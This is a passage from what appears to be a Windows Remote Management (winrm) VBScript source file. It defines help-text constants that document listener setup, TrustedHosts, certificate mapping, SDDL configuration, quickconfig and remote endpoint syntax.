private const X_HelpConfigExamples_002_0_Message = "  winrm create winrm/config/listener?Address=*+Transport=HTTP"
private const L_HelpConfigExamples_003_0_Message = ""
private const L_HelpConfigExamples_004_0_Message = "Example: To disable a given listener"
private const X_HelpConfigExamples_005_0_Message = "  winrm set winrm/config/listener?Address=IP:1.2.3.4+Transport=HTTP @{Enabled=""false""}"
private const L_HelpConfigExamples_006_0_Message = ""
private const L_HelpConfigExamples_007_0_Message = "Example: To enable basic authentication on the client but not the service:"
private const X_HelpConfigExamples_008_0_Message = "  winrm set winrm/config/client/auth @{Basic=""true""}"
private const L_HelpConfigExamples_009_0_Message = ""
private const L_HelpConfigExamples_010_0_Message = "Example: To enable Negotiate for all workgroup machines."
private const X_HelpConfigExamples_011_0_Message = "  winrm set winrm/config/client @{TrustedHosts=""<local>""}"
private const L_HelpConfigExamples_012_0_Message = ""
private const L_HelpConfigExamples_013_0_Message = "Example: To add an IPv4 and IPv6 host address to TrustedHosts."
private const X_HelpConfigExamples_014_0_Message = "  winrm set winrm/config/client @{TrustedHosts=""1.2.3.4,[1:2:3::8]""}"
private const L_HelpConfigExamples_015_0_Message = ""
private const L_HelpConfigExamples_016_0_Message = "  Note: Computers in the TrustedHosts list might not be authenticated"

'''''''''''''''''''''
' HELP - CertMapping
private const L_HelpCertMapping_001_0_Message = "Certificate mapping remote access to WinRM using client certificates is "
private const L_HelpCertMapping_002_0_Message = "stored in the certificate mapping table identified by the "
private const L_HelpCertMapping_003_0_Message = "following resource URI:"
private const L_HelpCertMapping_003_1_Message = ""
private const L_HelpCertMapping_004_0_Message = " winrm/config/service/CertMapping"
private const L_HelpCertMapping_005_0_Message = ""
private const L_HelpCertMapping_006_0_Message = "Each entry in this table contains five properties:"
private const L_HelpCertMapping_007_0_Message = " Issuer -  Thumbprint of the issuer certificate."
private const L_HelpCertMapping_008_0_Message = " Subject - Subject field of client certificate."
private const L_HelpCertMapping_009_0_Message = " URI - The URI or URI prefix for which this mapping applies."
private const L_HelpCertMapping_009_1_Message = " Username - Local username for processing the request."
private const L_HelpCertMapping_009_2_Message = " Password - Local password for processing the request."
private const L_HelpCertMapping_009_3_Message = " Enabled - Use in processing if true."
private const L_HelpCertMapping_010_0_Message = "  "
private const L_HelpCertMapping_011_0_Message = "For a client certificate to be applicable, the issuer certificate must be  "
private const L_HelpCertMapping_012_0_Message = "available locally and match the thumbprint in the entry Issuer property"
private const L_HelpCertMapping_012_1_Message = ""
private const L_HelpCertMapping_012_2_Message = "For a client certificate to be applicable, its DNS or Principal name "
private const L_HelpCertMapping_013_0_Message = "(from the SubjectAlternativeName field) must match the Subject property."
private const L_HelpCertMapping_014_0_Message = "The value can start with a '*' wildcard."
private const L_HelpCertMapping_014_1_Message = "The URI identifies for which resources the indicated client certificates ."
private const L_HelpCertMapping_014_2_Message = "should be mapped."
private const L_HelpCertMapping_014_3_Message = "The value can end with a '*' wildcard."
private const L_HelpCertMapping_014_4_Message = ""

private const L_HelpCertMapping_015_0_Message = "If the client certificate matches the entry and it is enabled, the "
private const L_HelpCertMapping_016_0_Message = "request is processed under the local account with the given username "

private const L_HelpCertMapping_017_0_Message = "and password after ensuring that user has access to the resource as "
private const L_HelpCertMapping_018_0_Message = "defined by the URI security table."
private const L_HelpCertMapping_019_0_Message = ""

private const L_HelpCertMapping_020_0_Message = "When creating a new entry or changing the password of an existing entry, "
private const L_HelpCertMapping_021_0_Message = "the -r switch must be used since the WinRM service must store the password"
private const L_HelpCertMapping_022_0_Message = "for future use."


private const L_HelpCertMappingExamples_001_0_Message = "Example: To see the current CertMapping configuration"
private const X_HelpCertMappingExamples_002_0_Message = "  winrm enumerate winrm/config/service/CertMapping"

private const L_HelpCertMappingExamples_003_0_Message = "Example: Create a CertMapping entry:"
private const X_HelpCertMappingExamples_004_0_Message = "  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{UserName=""USERNAME"";Password=""PASSWORD""} -remote:localhost"
private const L_HelpCertMappingExamples_005_0_Message = ""

'''''''''''''''''''''
' HELP - CONFIGSDDL
private const L_HelpConfigsddl_000_1_Message = "  winrm configsddl RESOURCE_URI"
private const L_HelpConfigsddl_001_0_Message = ""
private const L_HelpConfigsddl_002_0_Message = "Changes an existing entry in the plugin configuration to "
private const L_HelpConfigsddl_002_1_Message = "control remote access to WinRM resources."
private const L_HelpConfigsddl_003_0_Message = "This command will fail if the plugin does not exist."
private const L_HelpConfigsddl_004_0_Message = ""
private const L_HelpConfigsddl_005_0_Message = "This command will launch a GUI to edit the security settings."
private const L_HelpConfigsddl_005_1_Message = ""
private const L_HelpConfigsddl_006_0_Message = "RESOURCE_URI is always treated as a prefix."
private const L_HelpConfigsddl_010_0_Message = ""
private const L_HelpConfigsddl_011_0_Message = "To change the default security (the RootSDDL setting) use:"
private const X_HelpConfigsddl_012_0_Message = "  winrm configsddl default"

'''''''''''''''''''''
' HELP - QUICKCONFIG
private const X_HelpQuickConfig_001_0_Message = "winrm quickconfig [-quiet] [-transport:VALUE] [-force]"
private const X_HelpQuickConfig_002_0_Message = ""
private const L_HelpQuickConfig_003_0_Message = "Performs configuration actions to enable this machine for remote management."
private const L_HelpQuickConfig_004_0_Message = "Includes:"
private const L_HelpQuickConfig_005_0_Message = "  1. Start the WinRM service"
private const L_HelpQuickConfig_006_0_Message = "  2. Set the WinRM service type to auto start"
private const L_HelpQuickConfig_007_0_Message = "  3. Create a listener to accept request on any IP address"
private const L_HelpQuickConfig_008_0_Message = "  4. Enable firewall exception for WS-Management traffic (for http only)"
private const X_HelpQuickConfig_009_0_Message = ""
private const X_HelpQuickConfig_010_0_Message = "-q[uiet]"
private const X_HelpQuickConfig_010_1_Message = "--------"
private const L_HelpQuickConfig_011_0_Message = "If present, quickconfig will not prompt for confirmation."
private const X_HelpQuickConfig_012_0_Message = "-transport:VALUE"
private const X_HelpQuickConfig_013_0_Message = "----------------"
private const L_HelpQuickConfig_014_0_Message = "Perform quickconfig for specific transport."
private const L_HelpQuickConfig_015_0_Message = "Possible options are http and https.  Defaults to http."
private const X_HelpQuickConfig_016_0_Message = "-force"
private const X_HelpQuickConfig_017_0_Message = "--------"
private const L_HelpQuickConfig_018_0_Message = "If present, quickconfig will not prompt for confirmation, and will enable "
private const L_HelpQuickConfig_019_0_Message = "the firewall exception regardless of current network profile settings."

'''''''''''''''''''''
' HELP - REMOTE
private const L_HelpRemote_001_0_Message = "winrm OPERATION -remote:VALUE [-unencrypted] [-usessl]"
private const L_HelpRemote_002_0_Message = ""
private const L_HelpRemote_003_0_Message = "-r[emote]:VALUE"
private const L_HelpRemote_004_0_Message = "---------------"
private const L_HelpRemote_005_0_Message = "Specifies identifier of remote endpoint/system.  "
private const L_HelpRemote_006_0_Message = "May be a simple host name or a complete URL."
private const L_HelpRemote_007_0_Message = ""
private const L_HelpRemote_008_0_Message = "  [TRANSPORT://]HOST[:PORT][/PREFIX]"
private const L_HelpRemote_009_0_Message = ""
private const L_HelpRemote_010_0_Message = "Transport: One of HTTP or HTTPS; default is HTTP."
private const L_HelpRemote_011_0_Message = "Host: Can be in the form of a DNS name, NetBIOS name, or IP address."
private const L_HelpRemote_012_0_Message = "Port: If port is not specified then the following default rules apply:"
private const L_HelpRemote_013_0_Message = "Prefix: Defaults to wsman."
private const L_HelpRemote_014_0_Message = ""
private const L_HelpRemote_015_0_Message = "Note: IPv6 addresses must be enclosed in brackets."
private const L_HelpRemote_016_0_Message = "Note: When using HTTPS, the machine name must match the server's certificate"
private const L_HelpRemote_017_0_Message = "      common name (CN) unless -skipCNcheck is used."
private const L_HelpRemote_018_0_Message = "Note: Defaults for port and prefix can be changed in the local configuration."
